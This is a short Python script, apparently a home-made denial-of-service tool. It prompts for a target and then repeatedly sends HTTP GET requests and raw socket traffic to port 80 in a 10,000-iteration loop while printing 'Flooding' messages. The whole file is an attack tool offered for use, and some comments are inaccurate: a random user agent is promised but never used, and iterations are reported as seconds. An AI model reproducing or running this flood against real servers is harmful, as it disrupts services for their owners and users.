#!/bin/python3

import socket
import random
import requests

# the useragent to bypass response code 404 and keep connection open on response 200
useragent = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"}

# creating the function and sending a get request to our target ip and connecting on port 80 HTTP

def flood(target):
    req = requests.get(f"http://{target}:80/", headers=useragent)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target, 80))
    sock.sendto(req.content, (target, 80))
    sock.close()

# creating a loop to get a random user agent

target = input("[!] target? ") 
# now connecting to IP address on port 80 with useragent to flood the server on repeat with a for loop.
for _ in range(1,10000):
    flood(target) # calling the function/starting flood in for loop
    print(f"[+] Flooding {target} on port 80 for {_} seconds")
